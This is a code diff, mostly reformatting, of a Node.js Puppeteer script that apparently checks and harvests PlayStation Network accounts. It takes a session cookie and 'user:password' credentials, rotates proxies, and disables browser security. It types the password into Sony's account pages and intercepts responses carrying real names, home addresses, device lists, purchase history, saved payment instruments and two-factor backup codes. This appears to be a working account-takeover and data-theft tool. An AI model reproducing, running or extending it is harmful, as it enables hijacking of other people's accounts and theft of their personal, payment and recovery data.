@@ -16,38 +16,39 @@ const path = require("path");
 let countries;
 
 (async () => {
-  countries = await fs.readFile('./data/countries.json', 'utf8');
+    countries = await fs.readFile('./data/countries.json', 'utf8');
 
-  countries = JSON.parse(countries)
+    countries = JSON.parse(countries)
 })()
 
 
 // Target URLs to monitor
 const TARGET_URLS = [
-  "https://web.np.playstation.com/api/graphql/v1/op?operationName=getProfileOracle",
-  "https://web.np.playstation.com/api/graphql/v1/op?operationName=getPurchasedGameList",
-  "https://web.np.playstation.com/api/graphql/v1/op?operationName=queryOracleUserProfileFullSubscription",
-  "https://web.np.playstation.com/api/graphql/v1/op?operationName=getUserDevices",
-  "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
-  /\/twostepbackupcodes$/,
-  "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
-  "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
+    "https://web.np.playstation.com/api/graphql/v1/op?operationName=getProfileOracle",
+    "https://web.np.playstation.com/api/graphql/v1/op?operationName=getPurchasedGameList",
+    "https://web.np.playstation.com/api/graphql/v1/op?operationName=queryOracleUserProfileFullSubscription",
+    "https://web.np.playstation.com/api/graphql/v1/op?operationName=getUserDevices",
+    "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
+    /\/twostepbackupcodes$/,
+    "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
+    "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
+    'https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions'
 ];
 
 // Page configurations
 const PAGE_CONFIGS = {
-  FIRST: {
-    url: "https://id.sonyentertainmentnetwork.com/id/management/#/p?entry=p",
-    name: "page1",
-    waitTime: 15000,
-  },
-  SECOND: {
-    url: "https://library.playstation.com/recently-purchased",
-    name: "page2",
-    waitTime: 10000,
-  },
-  API_URL:
-    "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
+    FIRST: {
+        url: "https://id.sonyentertainmentnetwork.com/id/management/#/p?entry=p",
+        name: "page1",
+        waitTime: 15000,
+    },
+    SECOND: {
+        url: "https://library.playstation.com/recently-purchased",
+        name: "page2",
+        waitTime: 10000,
+    },
+    API_URL:
+        "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
 };
 
 /**
@@ -56,15 +57,15 @@ const PAGE_CONFIGS = {
  * @returns {Object} Cookie object for NPSSO
  */
 function createNpssoCookie(npssoValue) {
-  return {
-    name: "npsso",
-    value: npssoValue,
-    domain: ".sonyentertainmentnetwork.com",
-    path: "/",
-    httpOnly: false,
-    secure: true,
-    sameSite: "None",
-  };
+    return {
+        name: "npsso",
+        value: npssoValue,
+        domain: ".sonyentertainmentnetwork.com",
+        path: "/",
+        httpOnly: false,
+        secure: true,
+        sameSite: "None",
+    };
 }
 
 /**
@@ -73,7 +74,7 @@ function createNpssoCookie(npssoValue) {
  * @returns {string} Formatted cookie string
  */
 function formatCookiesForHeader(cookies) {
-  return cookies.map((cookie) => `${cookie.name}=${cookie.value}`).join("; ");
+    return cookies.map((cookie) => `${cookie.name}=${cookie.value}`).join("; ");
 }
 
 /**
@@ -82,13 +83,13 @@ function formatCookiesForHeader(cookies) {
  * @returns {Promise<void>}
  */
 async function ensureDirectoryExists(dirPath) {
-  try {
-    await fs.mkdir(dirPath, { recursive: true });
-  } catch (error) {
-    if (error.code !== "EEXIST") {
-      throw error;
+    try {
+        await fs.mkdir(dirPath, { recursive: true });
+    } catch (error) {
+        if (error.code !== "EEXIST") {
+            throw error;
+        }
     }
-  }
 }
 
 /**
@@ -97,11 +98,11 @@ async function ensureDirectoryExists(dirPath) {
  * @returns {boolean} Whether the request should be tracked
  */
 function isRelevantRequest(url) {
-  const staticResourceExtensions = [".ico", ".png", ".jpg", ".css", ".js"];
-  return (
-    (url.startsWith("http://") || url.startsWith("https://")) &&
-    !staticResourceExtensions.some((ext) => url.includes(ext))
-  );
+    const staticResourceExtensions = [".ico", ".png", ".jpg", ".css", ".js"];
+    return (
+        (url.startsWith("http://") || url.startsWith("https://")) &&
+        !staticResourceExtensions.some((ext) => url.includes(ext))
+    );
 }
 
 /**
@@ -110,16 +111,16 @@ function isRelevantRequest(url) {
  * @returns {boolean} Whether the response should be processed
  */
 function isRelevantResponse(url) {
-  const ignoredResources = [
-    ".ico",
-    ".png",
-    ".jpg",
-    ".css",
-    ".js",
-    ".woff",
-    ".woff2",
-  ];
-  return !ignoredResources.some((resource) => url.includes(resource));
+    const ignoredResources = [
+        ".ico",
+        ".png",
+        ".jpg",
+        ".css",
+        ".js",
+        ".woff",
+        ".woff2",
+    ];
+    return !ignoredResources.some((resource) => url.includes(resource));
 }
 
 /**
@@ -129,28 +130,28 @@ function isRelevantResponse(url) {
  * @returns {Promise<*>} Extracted response data
  */
 async function extractResponseData(response, headers) {
-  const contentType = headers["content-type"] || "";
-  const textBasedTypes = ["json", "text", "html", "xml"];
+    const contentType = headers["content-type"] || "";
+    const textBasedTypes = ["json", "text", "html", "xml"];
 
-  if (textBasedTypes.some((type) => contentType.includes(type))) {
-    try {
-      const text = await response.text();
-
-      // Parse JSON if content type indicates JSON
-      if (contentType.includes("json")) {
+    if (textBasedTypes.some((type) => contentType.includes(type))) {
         try {
-          return JSON.parse(text);
+            const text = await response.text();
+
+            // Parse JSON if content type indicates JSON
+            if (contentType.includes("json")) {
+                try {
+                    return JSON.parse(text);
+                } catch (e) {
+                    return text; // Return as text if JSON parsing fails
+                }
+            }
+            return text;
         } catch (e) {
-          return text; // Return as text if JSON parsing fails
+            return `Error getting response data: ${e.message}`;
         }
-      }
-      return text;
-    } catch (e) {
-      return `Error getting response data: ${e.message}`;
+    } else {
+        return `[Binary data with content-type: ${contentType}]`;
     }
-  } else {
-    return `[Binary data with content-type: ${contentType}]`;
-  }
 }
 
 /**
@@ -159,15 +160,15 @@ async function extractResponseData(response, headers) {
  * @returns {string} Operation name or endpoint
  */
 function extractOperationName(url) {
-  const urlObj = new URL(url);
+    const urlObj = new URL(url);
 
-  if (urlObj.searchParams.has("operationName")) {
-    return urlObj.searchParams.get("operationName");
-  } else {
-    // Use the last part of the path if no operationName
-    const pathParts = urlObj.pathname.split("/");
-    return pathParts[pathParts.length - 1];
-  }
+    if (urlObj.searchParams.has("operationName")) {
+        return urlObj.searchParams.get("operationName");
+    } else {
+        // Use the last part of the path if no operationName
+        const pathParts = urlObj.pathname.split("/");
+        return pathParts[pathParts.length - 1];
+    }
 }
 
 /**
@@ -181,106 +182,106 @@ function extractOperationName(url) {
  * @returns {Promise<void>}
  */
 async function setupRequestAndResponseTracking(
-  page,
-  npssoValue,
-  targetUrls,
-  finalResponses,
-  onProgress,
-  onData
+    page,
+    npssoValue,
+    targetUrls,
+    finalResponses,
+    onProgress,
+    onData
 ) {
-  await page.setRequestInterception(true);
-  const requestMap = new Map();
+    await page.setRequestInterception(true);
+    const requestMap = new Map();
 
-  page.on("request", (request) => {
-    const url = request.url();
-    const headers = request.headers();
-    const method = request.method();
-    const resourceType = request.resourceType();
-    const postData = request.postData();
-    let modified = false;
+    page.on("request", (request) => {
+        const url = request.url();
+        const headers = request.headers();
+        const method = request.method();
+        const resourceType = request.resourceType();
+        const postData = request.postData();
+        let modified = false;
 
-    requestMap.set(request._requestId, {
-      url,
-      method,
-      headers,
-      resourceType,
-      postData,
-      timestamp: new Date().toISOString(),
+        requestMap.set(request._requestId, {
+            url,
+            method,
+            headers,
+            resourceType,
+            postData,
+            timestamp: new Date().toISOString(),
+        });
+
+        if (isRelevantRequest(url)) {
+            if (headers.cookie) {
+                if (!headers.cookie.includes("npsso=")) {
+                    headers.cookie = `${headers.cookie}; npsso=${npssoValue}`;
+                    modified = true;
+                }
+            } else {
+                headers.cookie = `npsso=${npssoValue}`;
+                modified = true;
+            }
+        }
+
+        if (modified) {
+            request.continue({ headers });
+            onProgress(`Modified request to: ${url}`);
+        } else {
+            request.continue();
+        }
     });
 
-    if (isRelevantRequest(url)) {
-      if (headers.cookie) {
-        if (!headers.cookie.includes("npsso=")) {
-          headers.cookie = `${headers.cookie}; npsso=${npssoValue}`;
-          modified = true;
-        }
-      } else {
-        headers.cookie = `npsso=${npssoValue}`;
-        modified = true;
-      }
-    }
+    page.on("response", async (response) => {
+        try {
+            const request = response.request();
+            const url = response.url();
+            const requestId = request._requestId;
+            const requestInfo = requestMap.get(requestId);
 
-    if (modified) {
-      request.continue({ headers });
-      onProgress(`Modified request to: ${url}`);
-    } else {
-      request.continue();
-    }
-  });
+            if (requestInfo && isRelevantResponse(url)) {
+                const responseHeaders = response.headers();
+                let responseData = await extractResponseData(response, responseHeaders);
 
-  page.on("response", async (response) => {
-    try {
-      const request = response.request();
-      const url = response.url();
-      const requestId = request._requestId;
-      const requestInfo = requestMap.get(requestId);
+                // بررسی اینکه url با یکی از targetUrl ها مچ بشه
+                for (const targetUrl of targetUrls) {
+                    if (isMatchingTargetUrl(url, targetUrl)) {
+                        onProgress(`Found target request: ${url}`);
 
-      if (requestInfo && isRelevantResponse(url)) {
-        const responseHeaders = response.headers();
-        let responseData = await extractResponseData(response, responseHeaders);
+                        const operationName = extractOperationName(url);
+                        console.log("operationName =======> ", operationName);
 
-        // بررسی اینکه url با یکی از targetUrl ها مچ بشه
-        for (const targetUrl of targetUrls) {
-          if (isMatchingTargetUrl(url, targetUrl)) {
-            onProgress(`Found target request: ${url}`);
+                        if (operationName === "operationName") {
+                            const allCookies = await page.cookies();
+                            const twoSteps = await axios.get(url, {
+                                headers: {
+                                    Cookie: allCookies
+                                        .map((cookie) => `${cookie.name}=${cookie.value}`)
+                                        .join("; "),
+                                },
+                            });
 
-            const operationName = extractOperationName(url);
-            console.log("operationName =======> ", operationName);
+                            console.log(twoSteps);
+                            process.exit(1);
+                        }
 
-            if (operationName === "operationName") {
-              const allCookies = await page.cookies();
-              const twoSteps = await axios.get(url, {
-                headers: {
-                  Cookie: allCookies
-                    .map((cookie) => `${cookie.name}=${cookie.value}`)
-                    .join("; "),
-                },
-              });
-
-              console.log(twoSteps);
-              process.exit(1);
+                        processTargetResponse(operationName, responseData, finalResponses);
+                        onData(finalResponses);
+                        break;
+                    }
+                }
             }
-
-            processTargetResponse(operationName, responseData, finalResponses);
-            onData(finalResponses);
-            break;
-          }
+        } catch (error) {
+            console.error(`Error processing response: ${error.message}`);
+        } finally {
+            requestMap.delete(response.request()._requestId);
         }
-      }
-    } catch (error) {
-      console.error(`Error processing response: ${error.message}`);
-    } finally {
-      requestMap.delete(response.request()._requestId);
-    }
-  });
+    });
 }
 
 // این تابع جدید اضافه شده
 function isMatchingTargetUrl(url, targetUrl) {
-  if (targetUrl instanceof RegExp) {
-    return targetUrl.test(url);
-  }
-  return url === targetUrl || url.startsWith(targetUrl);
+    if (targetUrl instanceof RegExp) {
+        return targetUrl.test(url);
+    }
+    return url === targetUrl || url.startsWith(targetUrl);
 }
 
 /**
@@ -290,69 +291,75 @@ function isMatchingTargetUrl(url, targetUrl) {
  * @param {Object} finalResponses - Object to store processed responses
  */
 function processTargetResponse(operationName, responseData, finalResponses) {
-  switch (operationName) {
-    case "communication":
-      if (responseData.realName) {
-        finalResponses.profile = {
-          ...(finalResponses.profile || {}),
-          firstName: responseData.realName.name.first,
-          lastName: responseData.realName.name.last,
-        };
-      }
-      break;
+    switch (operationName) {
+        case "communication":
+            if (responseData.realName) {
+                finalResponses.profile = {
+                    ...(finalResponses.profile || {}),
+                    firstName: responseData.realName.name.first,
+                    lastName: responseData.realName.name.last,
+                };
+            }
+            break;
 
-    case "getProfileOracle":
-      if (responseData.data?.oracleUserProfileRetrieve) {
-        const profile = responseData.data.oracleUserProfileRetrieve;
-        finalResponses.profile = {
-          ...(finalResponses.profile || {}),
-          name: profile.name,
-          accountId: profile.accountId,
-          age: profile.age,
-          isOfficiallyVerified: profile.isOfficiallyVerified,
-          isPsPlusMember: profile.isPsPlusMember,
-          locale: profile.locale,
-          onlineId: profile.onlineId,
-        };
-      }
-      break;
+        case "getProfileOracle":
+            if (responseData.data?.oracleUserProfileRetrieve) {
+                const profile = responseData.data.oracleUserProfileRetrieve;
+                console.log('---------', profile);
 
-    case "getPurchasedGameList":
-      if (responseData.data?.purchasedTitlesRetrieve) {
-        finalResponses.games =
-          responseData.data.purchasedTitlesRetrieve.games.map((item) => ({
-            name: item.name,
-            platform: item.platform,
-            membership: item.membership,
-            isDownloadable: item.isDownloadable,
-          }));
-      }
-      break;
+                finalResponses.profile = {
+                    ...(finalResponses.profile || {}),
+                    name: profile.name,
+                    accountId: profile.accountId,
+                    age: profile.age,
+                    isOfficiallyVerified: profile.isOfficiallyVerified,
+                    isPsPlusMember: profile.isPsPlusMember,
+                    locale: profile.locale,
+                    onlineId: profile.onlineId,
+                };
+            }
+            break;
 
-    case "getUserDevices":
-      if (responseData.data?.deviceStorageDetailsRetrieve) {
-        finalResponses.devices =
-          responseData.data.deviceStorageDetailsRetrieve.map((item) => ({
-            name: item.deviceName,
-            platform: item.devicePlatform,
-          }));
-      }
-      break;
+        case "getPurchasedGameList":
+            if (responseData.data?.purchasedTitlesRetrieve) {
+                finalResponses.games =
+                    responseData.data.purchasedTitlesRetrieve.games.map((item) => ({
+                        name: item.name,
+                        platform: item.platform,
+                        membership: item.membership,
+                        isDownloadable: item.isDownloadable,
+                    }));
+            }
+            break;
 
-    case "twostepbackupcodes":
-      if (responseData.backup_codes) {
-        finalResponses.backupCodes = responseData.backup_codes.map(
-          (item) => item.code
-        );
-      }
-      break;
+        case "getUserDevices":
+            if (responseData.data?.deviceStorageDetailsRetrieve) {
+                finalResponses.devices =
+                    responseData.data.deviceStorageDetailsRetrieve.map((item) => ({
+                        name: item.deviceName,
+                        platform: item.devicePlatform,
+                    }));
+            }
+            break;
 
-    case "addresses":
-      if (responseData.length > 0) {
-        const mainAddress = responseData?.find((item) => item.isMain);
-        finalResponses.address = { ...mainAddress };
-      }
-  }
+        case "twostepbackupcodes":
+            if (responseData.backup_codes) {
+                finalResponses.backupCodes = responseData.backup_codes.map(
+                    (item) => item.code
+                );
+            }
+            break;
+
+        case "addresses":
+            if (responseData.length > 0) {
+                const mainAddress = responseData?.find((item) => item.isMain);
+                finalResponses.address = { ...mainAddress };
+            }
+
+        case "getUserSubscriptions":
+            console.log('getUserSubscriptions ====> ', responseData);
+
+    }
 }
 
 /**
@@ -369,49 +376,49 @@ function processTargetResponse(operationName, responseData, finalResponses) {
  * @returns {Promise<Object>} Configured page
  */
 async function createConfiguredPage(
-  browser,
-  cookies,
-  npssoValue,
-  targetUrls,
-  finalResponses,
-  pageName,
-  onProgress,
-  onData,
-  proxyConfig = null
-) {
-  const page = await browser.newPage();
-
-  // Set proxy authentication if provided
-  if (proxyConfig) {
-    await page.authenticate({
-      username: proxyConfig.username,
-      password: proxyConfig.password,
-    });
-  }
-
-  // Set cookies if provided
-  if (cookies && cookies.length > 0) {
-    onProgress(`Transferring ${cookies.length} cookies to ${pageName}...`);
-    await Promise.all(cookies.map((cookie) => page.setCookie(cookie)));
-  } else if (npssoValue) {
-    // Set just the NPSSO cookie if no cookies provided
-    await page.setCookie(createNpssoCookie(npssoValue));
-  }
-
-  // Setup request tracking
-  await setupRequestAndResponseTracking(
-    page,
+    browser,
+    cookies,
     npssoValue,
     targetUrls,
     finalResponses,
+    pageName,
     onProgress,
-    onData
-  );
+    onData,
+    proxyConfig = null
+) {
+    const page = await browser.newPage();
 
-  // Set viewport
-  await page.setViewport({ width: 1920, height: 1080 });
+    // Set proxy authentication if provided
+    if (proxyConfig) {
+        await page.authenticate({
+            username: proxyConfig.username,
+            password: proxyConfig.password,
+        });
+    }
 
-  return page;
+    // Set cookies if provided
+    if (cookies && cookies.length > 0) {
+        onProgress(`Transferring ${cookies.length} cookies to ${pageName}...`);
+        await Promise.all(cookies.map((cookie) => page.setCookie(cookie)));
+    } else if (npssoValue) {
+        // Set just the NPSSO cookie if no cookies provided
+        await page.setCookie(createNpssoCookie(npssoValue));
+    }
+
+    // Setup request tracking
+    await setupRequestAndResponseTracking(
+        page,
+        npssoValue,
+        targetUrls,
+        finalResponses,
+        onProgress,
+        onData
+    );
+
+    // Set viewport
+    await page.setViewport({ width: 1920, height: 1080 });
+
+    return page;
 }
 
 /**
@@ -423,12 +430,12 @@ async function createConfiguredPage(
  * @returns {Promise<void>}
  */
 async function navigateToPage(page, url, description, onProgress) {
-  onProgress(`Opening ${description} (${url})...`);
-  await page.goto(url, {
-    waitUntil: "networkidle2",
-    timeout: 60000,
-  });
-  onProgress(`${description} loaded successfully.`);
+    onProgress(`Opening ${description} (${url})...`);
+    await page.goto(url, {
+        waitUntil: "networkidle2",
+        timeout: 60000,
+    });
+    onProgress(`${description} loaded successfully.`);
 }
 
 /**
@@ -437,18 +444,18 @@ async function navigateToPage(page, url, description, onProgress) {
  * @returns {Array} Combined unique cookies
  */
 function combineUniqueCookies(...cookieArrays) {
-  const cookieMap = new Map();
+    const cookieMap = new Map();
 
-  for (const cookieArray of cookieArrays) {
-    if (!cookieArray) continue;
+    for (const cookieArray of cookieArrays) {
+        if (!cookieArray) continue;
 
-    for (const cookie of cookieArray) {
-      const key = `${cookie.name}:${cookie.domain}`;
-      cookieMap.set(key, cookie);
+        for (const cookie of cookieArray) {
+            const key = `${cookie.name}:${cookie.domain}`;
+            cookieMap.set(key, cookie);
+        }
     }
-  }
 
-  return Array.from(cookieMap.values());
+    return Array.from(cookieMap.values());
 }
 
 /**
@@ -459,8 +466,8 @@ function combineUniqueCookies(...cookieArrays) {
  * @returns {Promise<void>}
  */
 async function wait(ms, reason, onProgress) {
-  onProgress(`Waiting ${ms}ms ${reason ? "(" + reason + ")" : ""}...`);
-  return new Promise((resolve) => setTimeout(resolve, ms));
+    onProgress(`Waiting ${ms}ms ${reason ? "(" + reason + ")" : ""}...`);
+    return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
 /**
@@ -476,484 +483,525 @@ async function wait(ms, reason, onProgress) {
  * @param {Function} options.onError - Error callback
  */
 async function runPsnApiTool(options) {
-  const {
-    credentials,
-    npsso,
-    proxyFile, // مسیر فایل پروکسی (در صورت آپلود شدن)
-    proxyData, // محتویات فایل پروکسی
-    onProgress = () => { },
-    onData = () => { },
-    onComplete = () => { },
-    onError = () => { },
-  } = options;
+    const {
+        credentials,
+        npsso,
+        proxyFile, // مسیر فایل پروکسی (در صورت آپلود شدن)
+        proxyData, // محتویات فایل پروکسی
+        onProgress = () => { },
+        onData = () => { },
+        onComplete = () => { },
+        onError = () => { },
+    } = options;
 
-  console.log(countries);
+    // Create a new object to store responses
+    let finalResponses = {};
 
-
-  // Create a new object to store responses
-  let finalResponses = {};
-
-  // درصورتی که پروکسی‌ها موجود باشند، یکی از آن‌ها را تست و انتخاب می‌کنیم
-  let proxyConfig = null;
-  if (proxyData) {
-    proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
-    if (proxyConfig) {
-      onProgress(
-        `پروکسی سالم انتخاب شده: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`
-      );
-    } else {
-      onProgress("هیچ پروکسی سالمی یافت نشد؛ ادامه بدون پروکسی");
-    }
-  }
-
-  // Browser launch options
-  const browserOptions = {
-    // executablePath: "/home/majid/Documents/chrome-linux/chrome",
-    headless: 'new', // در تولید می‌توانید headless را true کنید
-    defaultViewport: { width: 1920, height: 1080 },
-    args: [
-      "--no-sandbox",
-      "--disable-setuid-sandbox",
-      "--window-size=1920,1080",
-      "--disable-web-security",
-      "--disable-features=IsolateOrigins,site-per-process",
-      "--disable-site-isolation-trials",
-      "--disable-dev-shm-usage",
-      "--disable-accelerated-2d-canvas",
-      "--disable-gpu",
-    ],
-  };
-
-  // اضافه کردن پروکسی به args در صورت تنظیم شدن
-  if (proxyConfig) {
-    browserOptions.args.push(
-      `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
-    );
-  }
-
-  let browser;
-  try {
-    onProgress("راه‌اندازی مرورگر...");
-    browser = await puppeteer.launch(browserOptions);
-
-    // Setup first page
-    const page1 = await createConfiguredPage(
-      browser,
-      null,
-      npsso,
-      TARGET_URLS,
-      finalResponses,
-      PAGE_CONFIGS.FIRST.name,
-      onProgress,
-      onData,
-      proxyConfig
-    );
-
-    // Navigate to first page
-    await navigateToPage(page1, PAGE_CONFIGS.FIRST.url, "صفحه اول", onProgress);
-
-    // Wait for first page to fully load and cookies to be set
-    await wait(10000, "تا بارگذاری صفحه اول کامل شود", onProgress);
-
-    // بررسی وجود المان مورد نظر و کلیک روی آن
-    try {
-      const targetXPath =
-        "/html/body/div[3]/div/div[2]/div/div/div/main/div/div[2]/div/div/div/div[3]/div";
-      onProgress(`در حال بررسی وجود المان با XPath: ${targetXPath}`);
-
-      // انتظار برای ظاهر شدن المان با timeout مناسب
-      const targetElement = await page1
-        .waitForXPath(targetXPath, {
-          visible: true,
-          timeout: 8000,
-        })
-        .catch(() => null);
-
-      if (targetElement) {
-        onProgress("المان مورد نظر یافت شد؛ در حال کلیک...");
-        await targetElement.click();
-        onProgress("کلیک روی المان انجام شد.");
-
-        // انتظار برای ناوبری پس از کلیک
-        onProgress("در انتظار بارگذاری صفحه پس از کلیک...");
-        await Promise.race([
-          page1.waitForNavigation({
-            waitUntil: "networkidle2",
-            timeout: 10000,
-          }),
-          wait(6000, "برای اطمینان از بارگذاری صفحه", onProgress),
-        ]).catch(() => {
-          onProgress(
-            "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
-          );
-        });
-
-        onProgress("ادامه پردازش پس از کلیک روی المان");
-      } else {
-        onProgress("المان مورد نظر در صفحه یافت نشد؛ ادامه روند...");
-      }
-    } catch (error) {
-      onProgress(`خطا در بررسی یا کلیک روی المان: ${error.message}`);
-    }
-
-    // بررسی وجود فیلد ورود پسورد و پر کردن آن
-    try {
-      const passwordInputXPath =
-        "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[1]/div[2]/div/div/input";
-      const submitButtonXPath =
-        "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[3]/div/button";
-
-      onProgress("در حال بررسی وجود فیلد ورود پسورد...");
-
-      // انتظار برای ظاهر شدن فیلد پسورد با timeout مناسب
-      const passwordInput = await page1
-        .waitForXPath(passwordInputXPath, {
-          visible: true,
-          timeout: 5000,
-        })
-        .catch(() => null);
-
-      if (passwordInput) {
-        onProgress("فیلد ورود پسورد یافت شد؛ در حال پر کردن...");
-
-        // استخراج پسورد از credentials
-        const password = credentials.includes(":")
-          ? credentials.split(":")[1]
-          : "";
-
-        if (password) {
-          // پاک کردن محتوای فیلد قبل از وارد کردن پسورد
-          await passwordInput.click({ clickCount: 3 });
-          await passwordInput.press("Backspace");
-
-          // وارد کردن پسورد
-          await passwordInput.type(password, { delay: 50 });
-          onProgress("پسورد با موفقیت وارد شد.");
-
-          // انتظار برای دکمه ثبت
-          const submitButton = await page1
-            .waitForXPath(submitButtonXPath, {
-              visible: true,
-              timeout: 5000,
-            })
-            .catch(() => null);
-
-          if (submitButton) {
-            onProgress("دکمه ثبت یافت شد؛ در حال کلیک...");
-            await submitButton.click();
-            onProgress("کلیک روی دکمه ثبت انجام شد.");
-
-            // انتظار برای ناوبری پس از کلیک روی دکمه
-            onProgress("در انتظار بارگذاری صفحه پس از ثبت پسورد...");
-            await Promise.race([
-              page1.waitForNavigation({
-                waitUntil: "networkidle2",
-                timeout: 10000,
-              }),
-              wait(5000, "برای اطمینان از بارگذاری صفحه", onProgress),
-            ]).catch(() => {
-              onProgress(
-                "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
-              );
-            });
-
-            // رفرش صفحه
-            onProgress("در حال رفرش صفحه...");
-            await page1.reload({ waitUntil: "networkidle2" });
-            onProgress("صفحه با موفقیت رفرش شد.");
-          } else {
-            onProgress("دکمه ثبت یافت نشد.");
-          }
+    // درصورتی که پروکسی‌ها موجود باشند، یکی از آن‌ها را تست و انتخاب می‌کنیم
+    let proxyConfig = null;
+    if (proxyData) {
+        proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
+        if (proxyConfig) {
+            onProgress(
+                `پروکسی سالم انتخاب شده: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`
+            );
         } else {
-          onProgress("پسورد در credentials یافت نشد یا فرمت نادرست است.");
+            onProgress("هیچ پروکسی سالمی یافت نشد؛ ادامه بدون پروکسی");
         }
-      } else {
-        onProgress("فیلد ورود پسورد در صفحه یافت نشد؛ ادامه روند...");
-      }
-    } catch (error) {
-      onProgress(`خطا در پر کردن فیلد پسورد: ${error.message}`);
     }
 
-    // Get cookies from first page
-    const cookies = await page1.cookies();
-    onProgress(`دریافت ${cookies.length} کوکی از صفحه اول`);
+    // Browser launch options
+    const browserOptions = {
+        headless: 'new', // در تولید می‌توانید headless را true کنید
+        defaultViewport: { width: 1920, height: 1080 },
+        args: [
+            "--no-sandbox",
+            "--disable-setuid-sandbox",
+            "--window-size=1920,1080",
+            "--disable-web-security",
+            "--disable-features=IsolateOrigins,site-per-process",
+            "--disable-site-isolation-trials",
+            "--disable-dev-shm-usage",
+            "--disable-accelerated-2d-canvas",
+            "--disable-gpu",
+        ],
+    };
 
-    // Ensure NPSSO cookie is present
-    const hasNpsso = cookies.some((cookie) => cookie.name === "npsso");
-    if (!hasNpsso) {
-      onProgress("کوکی npsso یافت نشد؛ اضافه کردن دستی");
-      cookies.push(createNpssoCookie(npsso));
+    // اضافه کردن پروکسی به args در صورت تنظیم شدن
+    if (proxyConfig) {
+        browserOptions.args.push(
+            `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
+        );
     }
 
+    let browser;
     try {
-      onProgress("در حال تلاش برای کلیک روی عنصر مشخص...");
-      await page1.waitForXPath(
-        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div",
-        { timeout: 20000 }
-      );
-      const [element] = await page1.$x(
-        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div"
-      );
+        onProgress("راه‌اندازی مرورگر...");
+        browser = await puppeteer.launch(browserOptions);
 
-      if (element) {
-        onProgress("عنصر یافت شد؛ کلیک...");
-        await element.click();
-        onProgress("کلیک موفقیت‌آمیز.");
+        // Setup first page
+        const page1 = await createConfiguredPage(
+            browser,
+            null,
+            npsso,
+            TARGET_URLS,
+            finalResponses,
+            PAGE_CONFIGS.FIRST.name,
+            onProgress,
+            onData,
+            proxyConfig
+        );
 
-        await wait(3000, "پس از کلیک", onProgress);
+        // Navigate to first page
+        await navigateToPage(page1, PAGE_CONFIGS.FIRST.url, "صفحه اول", onProgress);
 
-        onProgress("در انتظار ناوبری پس از کلیک اول...");
+        // Wait for first page to fully load and cookies to be set
+        await wait(10000, "تا بارگذاری صفحه اول کامل شود", onProgress);
+
+        // بررسی وجود المان مورد نظر و کلیک روی آن
         try {
-          await page1
-            .waitForNavigation({
-              waitUntil: "networkidle2",
-              timeout: 10000,
-            })
-            .catch(() => {
-              onProgress("ناوبری رخ نداد یا قبلاً انجام شده است.");
-            });
-          await wait(3000, "تا پایداری صفحه جدید", onProgress);
-          onProgress(
-            'در حال تلاش برای یافتن و کلیک روی عنصري با XPath مشخص: //*[@id="ember138"]/div/div/div/div[1]/div'
-          );
-          await page1
-            .waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', {
-              timeout: 5000,
-            })
-            .catch((e) => {
-              onProgress(
-                `عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`
-              );
-            });
-          const [secondElement] = await page1.$x(
-            "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div"
-          );
-          if (secondElement) {
-            onProgress("عنصر دوم پیدا شد؛ کلیک...");
-            await secondElement.click();
-            onProgress("کلیک عنصر دوم موفقیت‌آمیز.");
-            await wait(3000, "پس از کلیک عنصر دوم", onProgress);
-          } else {
-            onProgress("عنصر دوم پیدا نشد؛ ادامه روند...");
-          }
+            const targetXPath =
+                "/html/body/div[3]/div/div[2]/div/div/div/main/div/div[2]/div/div/div/div[3]/div";
+            onProgress(`در حال بررسی وجود المان با XPath: ${targetXPath}`);
+
+            // انتظار برای ظاهر شدن المان با timeout مناسب
+            const targetElement = await page1
+                .waitForXPath(targetXPath, {
+                    visible: true,
+                    timeout: 8000,
+                })
+                .catch(() => null);
+
+            if (targetElement) {
+                onProgress("المان مورد نظر یافت شد؛ در حال کلیک...");
+                await targetElement.click();
+                onProgress("کلیک روی المان انجام شد.");
+
+                // انتظار برای ناوبری پس از کلیک
+                onProgress("در انتظار بارگذاری صفحه پس از کلیک...");
+                await Promise.race([
+                    page1.waitForNavigation({
+                        waitUntil: "networkidle2",
+                        timeout: 10000,
+                    }),
+                    wait(6000, "برای اطمینان از بارگذاری صفحه", onProgress),
+                ]).catch(() => {
+                    onProgress(
+                        "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
+                    );
+                });
+
+                onProgress("ادامه پردازش پس از کلیک روی المان");
+            } else {
+                onProgress("المان مورد نظر در صفحه یافت نشد؛ ادامه روند...");
+            }
         } catch (error) {
-          onProgress(`خطا در کلیک دوم: ${error.message}`);
+            onProgress(`خطا در بررسی یا کلیک روی المان: ${error.message}`);
         }
-      } else {
-        onProgress("عنصر با XPath مشخص یافت نشد.");
-      }
-    } catch (error) {
